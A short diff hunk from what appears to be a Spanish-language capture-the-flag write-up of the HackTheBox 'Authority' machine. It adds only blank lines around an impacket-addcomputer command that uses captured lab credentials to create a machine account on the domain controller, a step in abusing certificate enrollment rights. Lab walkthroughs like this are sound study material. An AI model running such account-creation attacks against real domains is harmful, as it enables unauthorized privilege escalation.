@@ -282,6 +282,9 @@ aquí podemos ver que Domain Computers tiene permisos de `Enrollment Rights` lo 
 
 ### impacket-addcomputer
 ```python
+
 impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -computer-name 'gamuke' -computer-pass 'gamuke123'
+
+
 ```
 ![[Pasted image 20240326235443.png]]
